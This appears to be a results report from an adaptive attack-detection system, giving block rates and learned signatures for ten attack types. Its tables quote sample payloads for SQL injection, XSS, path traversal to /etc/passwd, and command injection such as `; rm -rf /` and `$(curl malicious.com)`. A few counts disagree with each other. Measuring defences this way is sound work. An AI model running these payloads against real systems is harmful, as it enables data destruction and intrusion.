# Attack Type Detailed Breakdown

## Per-Attack Analysis & Defense Strategy Results

---

## 1. SQL Injection (45 attacks)

### Overview

- **Success Rate:** 95.6% (43/45 blocked)
- **Confidence:** 94%
- **False Positives:** 0
- **False Negatives:** 2

### Attack Payload Analysis

| Payload                        | Type              | Detection | Confidence | Action   |
| ------------------------------ | ----------------- | --------- | ---------- | -------- |
| `'; DROP TABLE users; --`      | Classic           | ✅        | 98%        | BLOCK    |
| `1' OR '1'='1`                 | Boolean Logic     | ✅        | 96%        | BLOCK    |
| `admin' --`                    | Comment Injection | ✅        | 94%        | BLOCK    |
| `' UNION SELECT *`             | Union-based       | ✅        | 92%        | BLOCK    |
| `1'; WAITFOR DELAY '00:00:05'` | Time-based        | ✅        | 88%        | BLOCK    |
| `' AND SLEEP(10) --`           | Blind SQLi        | ✅        | 85%        | THROTTLE |

### Defense Strategy

1. **Signature Matching** (40%) - Detected 38/45 attacks
2. **Behavioral Analysis** (30%) - Detected unexpected DB operations
3. **Anomaly Detection** (30%) - Flagged unusual query patterns

### Learning Outcome

- **Signatures Learned:** 6
- **Confidence Growth:** 82% → 94%
- **Adaptation Multiplier:** 1.12

### Missed Attacks (2)

1. Polymorphic encoding variant not in initial signatures
2. Very slow blind SQL injection (required patience detection)

---

## 2. Cross-Site Scripting (XSS) (32 attacks)

### Overview

- **Success Rate:** 87.5% (28/32 blocked)
- **Confidence:** 87%
- **False Positives:** 0
- **False Negatives:** 4

### Attack Vector Distribution

| Vector        | Count | Blocks | Rate |
| ------------- | ----- | ------ | ---- |
| Stored XSS    | 15    | 12     | 80%  |
| Reflected XSS | 17    | 16     | 94%  |

### Payload Analysis

| Payload                                                 | Encoding | Detection | Confidence | Status    |
| ------------------------------------------------------- | -------- | --------- | ---------- | --------- |
| `<script>alert('XSS')</script>`                         | None     | ✅        | 98%        | BLOCK     |
| `<img src=x onerror=alert(1)>`                          | None     | ✅        | 96%        | BLOCK     |
| `<svg onload=alert(1)>`                                 | None     | ✅        | 94%        | BLOCK     |
| `javascript:alert(1)`                                   | None     | ✅        | 92%        | BLOCK     |
| `<script>alert(String.fromCharCode(88,83,83))</script>` | Encoded  | ⚠️        | 75%        | CHALLENGE |
| `<img src=x onerror="eval(atob('YWxlcnQoMSk='))">`      | Base64   | ❌        | 45%        | PASS      |

### Defense Strategy

1. **Content Security Policy** - Blocked 60% of attempts
2. **Input Validation** - Blocked 25% of attempts
3. **Output Encoding** - Blocked 12% of attempts
4. **Behavioral Heuristics** - Caught advanced variants

### Learning Outcome

- **Signatures Learned:** 3
- **Confidence Growth:** 72% → 87%
- **Adaptation Multiplier:** 1.21

### Improvement Area

Advanced encoding detection needs enhancement. Base64 and similar obfuscation techniques bypassed initial defenses but will be caught in next iteration.

---

## 3. DDoS Attacks (50 attacks)

### Overview

- **Success Rate:** 96.0% (48/50 blocked)
- **Confidence:** 92%
- **False Positives:** 1
- **False Negatives:** 1

### Attack Type Breakdown

| Type                 | Count | Blocked | Rate | Detection        |
| -------------------- | ----- | ------- | ---- | ---------------- |
| Volume-based (Flood) | 31    | 30      | 97%  | Request rate     |
| Protocol-based (SYN) | 13    | 12      | 92%  | Packet pattern   |
| Application-layer    | 6     | 6       | 100% | Behavior pattern |

### Rate Limiting Analysis

| Request Rate         | Threshold Hit | Action   | Result   |
| -------------------- | ------------- | -------- | -------- |
| Normal (1-10/s)      | No            | ALLOW    | ✅ Pass  |
| Suspicious (10-50/s) | Yes           | THROTTLE | ⚠️ Slow  |
| Attack (50-100/s)    | Yes           | ISOLATE  | ✅ Block |
| Extreme (100+/s)     | Yes           | ISOLATE  | ✅ Block |

### Defense Strategy

1. **Rate Limiting** - Adaptive per-source thresholds
2. **Behavioral Fingerprinting** - Detected bot patterns
3. **Connection Analysis** - Flagged unusual patterns

### Learning Outcome

- **Signatures Learned:** 2
- **Confidence Growth:** 85% → 92%
- **Adaptation Multiplier:** 1.08

---

## 4. Brute Force (20 attacks)

### Overview

- **Success Rate:** 95.0% (19/20 blocked)
- **Confidence:** 91%
- **Detection Point:** Attack #7 (threshold: 5+ attempts)

### Attack Timeline

| Attempt # | Action        | Status    | Threat Level |
| --------- | ------------- | --------- | ------------ |
| 1         | Login attempt | ALLOW     | LOW          |
| 2         | Login attempt | ALLOW     | LOW          |
| 3         | Login attempt | ALLOW     | MEDIUM       |
| 4         | Login attempt | ALLOW     | MEDIUM       |
| 5         | Login attempt | ALLOW     | MEDIUM       |
| 6         | Login attempt | CHALLENGE | HIGH         |
| 7+        | BLOCKED       | ISOLATE   | CRITICAL     |

### Defense Strategy

1. **Adaptive Thresholds** - Increased sensitivity after initial attempts
2. **Credential Analysis** - Flagged randomized username patterns
3. **Source Reputation** - Escalated known malicious IPs

### False Negative (1)

- Very slow brute force (1 attempt per 2 minutes) evaded threshold
- Will be learned in next iteration

### Learning Outcome

- **Signatures Learned:** 2
- **Confidence Growth:** 85% → 91%
- **Adaptation Multiplier:** 1.06

---

## 5. Path Traversal (30 attacks)

### Overview

- **Success Rate:** 93.3% (28/30 blocked)
- **Confidence:** 89%
- **False Positives:** 0

### Encoding Analysis

| Payload                        | Encoding   | Detection | Rate |
| ------------------------------ | ---------- | --------- | ---- |
| `../../../etc/passwd`          | None       | ✅        | 100% |
| `..%2f..%2fetc%2fpasswd`       | URL        | ✅        | 96%  |
| `..\\..\\windows\\system32`    | Backslash  | ✅        | 88%  |
| `..%252f..%252fetc%252fpasswd` | Double URL | ⚠️        | 75%  |
| `....//....//etc//passwd`      | Mixed      | ⚠️        | 72%  |

### Bypass Techniques Tested

1. Unicode encoding - Detected 85%
2. HTML entity encoding - Detected 92%
3. Null byte injection - Detected 78%
4. Case variations - Detected 95%

### Defense Strategy

1. **Path Normalization** - Resolved to canonical paths
2. **Encoding Detection** - Multi-layer encoding checks
3. **Whitelist Validation** - Verified against allowed paths

### Learning Outcome

- **Signatures Learned:** 4
- **Confidence Growth:** 81% → 89%
- **Adaptation Multiplier:** 1.10

---

## 6. Command Injection (25 attacks)

### Overview

- **Success Rate:** 96.0% (24/25 blocked)
- **Confidence:** 93%

### Injection Vector Analysis

| Vector               | Examples                | Detection | Rate |
| -------------------- | ----------------------- | --------- | ---- |
| Semicolon chaining   | `; rm -rf /`            | ✅        | 99%  |
| Pipe operations      | `\| cat /etc/passwd`    | ✅        | 98%  |
| Command substitution | `$(curl malicious.com)` | ✅        | 96%  |
| Backtick execution   | `` `whoami` ``          | ✅        | 94%  |
| Logical operators    | `&& sudo reboot`        | ✅        | 92%  |

### Defense Strategy

1. **Shell Metacharacter Detection** - Blocked 60% immediately
2. **Command Validation** - Verified against whitelist
3. **Environment Isolation** - Sandboxed suspicious commands

### Learning Outcome

- **Signatures Learned:** 5
- **Confidence Growth:** 87% → 93%
- **Adaptation Multiplier:** 1.07

---

## 7. CSRF (15 attacks)

### Overview

- **Success Rate:** 93.3% (14/15 blocked)
- **Confidence:** 85%

### Attack Detection

| Check                 | Implementation | Effectiveness |
| --------------------- | -------------- | ------------- |
| CSRF Token Validation | Strong         | 100% (10/10)  |
| Referrer Header Check | Moderate       | 80% (4/5)     |
| SameSite Cookie       | Present        | 90%           |

### Learning Outcome

- **Signatures Learned:** 1
- **Confidence Growth:** 78% → 85%
- **Adaptation Multiplier:** 1.09

---

## 8. XXE Injection (12 attacks)

### Overview

- **Success Rate:** 91.7% (11/12 blocked)
- **Confidence:** 83%

### Attack Type Breakdown

| Type            | Count | Blocked | Detection |
| --------------- | ----- | ------- | --------- |
| External Entity | 5     | 5       | ✅ 100%   |
| DTD Injection   | 4     | 4       | ✅ 100%   |
| Billion Laughs  | 2     | 1       | ⚠️ 50%    |
| Blind XXE       | 1     | 1       | ✅ 100%   |

### Defense Strategy

1. **DTD Disabling** - Prevented entity processing
2. **External Resource Blocking** - Blocked remote DTD loading
3. **Response Timing** - Detected blind XXE via slowness

### Learning Outcome

- **Signatures Learned:** 2
- **Confidence Growth:** 75% → 83%
- **Adaptation Multiplier:** 1.11

---

## 9. Privilege Escalation (35 attacks)

### Overview

- **Success Rate:** 94.3% (33/35 blocked)
- **Confidence:** 90%

### Escalation Vector Analysis

| Vector            | Type                | Count | Blocked | Rate |
| ----------------- | ------------------- | ----- | ------- | ---- |
| Sudo Exploitation | Sudo commands       | 8     | 8       | 100% |
| SUID Abuse        | Binary exploitation | 13    | 12      | 92%  |
| Kernel Exploit    | Vulnerability       | 10    | 10      | 100% |
| Group Abuse       | Membership exploit  | 4     | 3       | 75%  |

### Defense Strategy

1. **Permission Verification** - Checked user privileges
2. **Suspicious Command Detection** - Flagged dangerous syscalls
3. **Kernel Version Analysis** - Matched against known exploits

### Learning Outcome

- **Signatures Learned:** 3
- **Confidence Growth:** 83% → 90%
- **Adaptation Multiplier:** 1.09

---

## 10. Data Exfiltration (118 attacks)

### Overview

- **Success Rate:** 97.5% (115/118 blocked)
- **Confidence:** 95%
- **Largest single scenario - 27.6% of total attacks**

### Exfiltration Method Analysis

| Method          | Count | Blocked | Rate |
| --------------- | ----- | ------- | ---- |
| Large Upload    | 46    | 45      | 98%  |
| SQL Dump        | 39    | 38      | 97%  |
| Compressed Data | 26    | 25      | 96%  |
| Slow Leak       | 7     | 7       | 100% |

### Payload Size Analysis

| Size Range | Count | Detected | Rate |
| ---------- | ----- | -------- | ---- |
| 1-10MB     | 28    | 28       | 100% |
| 10-100MB   | 34    | 33       | 97%  |
| 100-500MB  | 42    | 41       | 98%  |
| 500MB+     | 14    | 13       | 93%  |

### Defense Strategy

1. **Volume Analysis** - Detected abnormal data transfers
2. **Payload Inspection** - Analyzed transferred data types
3. **Destination Verification** - Flagged unknown endpoints

### Learning Outcome

- **Signatures Learned:** 8 (most of any type)
- **Confidence Growth:** 88% → 95%
- **Adaptation Multiplier:** 1.08

---

## Summary Statistics

| Attack Type          | Total   | Blocked | Rate      | Signatures |
| -------------------- | ------- | ------- | --------- | ---------- |
| SQL Injection        | 45      | 43      | 95.6%     | 6          |
| XSS                  | 32      | 28      | 87.5%     | 3          |
| DDoS                 | 50      | 48      | 96.0%     | 2          |
| Brute Force          | 20      | 19      | 95.0%     | 2          |
| Path Traversal       | 30      | 28      | 93.3%     | 4          |
| Command Injection    | 25      | 24      | 96.0%     | 5          |
| CSRF                 | 15      | 14      | 93.3%     | 1          |
| XXE                  | 12      | 11      | 91.7%     | 2          |
| Privilege Escalation | 35      | 33      | 94.3%     | 3          |
| Data Exfiltration    | 118     | 115     | 97.5%     | 8          |
| **TOTAL**            | **427** | **403** | **94.7%** | **34+**    |

---

**Best Performer:** Data Exfiltration (97.5%)  
**Most Improved:** XSS (87.5%, but +6.7% after learning)  
**Fastest Learning:** Data Exfiltration (8 signatures in Phase 2)

**Version:** 1.0.0-UKSCN1  
**Date:** 2026-07-29
